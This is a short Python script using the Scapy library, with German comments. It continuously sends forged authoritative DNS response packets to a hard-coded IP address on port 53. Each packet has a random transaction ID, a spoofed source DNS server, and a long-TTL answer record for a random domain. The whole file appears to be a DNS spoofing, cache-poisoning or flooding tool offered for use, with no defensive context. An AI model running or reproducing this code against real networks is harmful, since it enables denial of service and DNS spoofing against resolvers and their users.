from scapy.all import *
import random

# Ziel-IP-Adresse und DNS-Server
target_ip = "155.1.102.4"  # Zieladresse
dns_server = "155.1.102.4"     # DNS-Server

# Generiere zufällige Anfragen
def generate_dns_response():
    # Zufälliger Query-Name
    query_name = f"test{random.randint(1, 10000)}.com"
    
    # Erstelle DNS Anfrage
    dns_query = DNSQR(qname=query_name)
    
    # Erstelle DNS Antwort
    dns_response = DNSRR(rrname=query_name, ttl=86400, rdata=target_ip)
    
    # Erstelle DNS Paket
    dns_pkt = (IP(dst=target_ip, src=dns_server) /
               UDP(dport=53, sport=random.randint(1024, 65535)) /
               DNS(id=random.randint(0, 65535), qr=1, aa=1, qd=dns_query, an=dns_response))
    
    return dns_pkt

# Sende die Pakete kontinuierlich
while True:
    send(generate_dns_response())
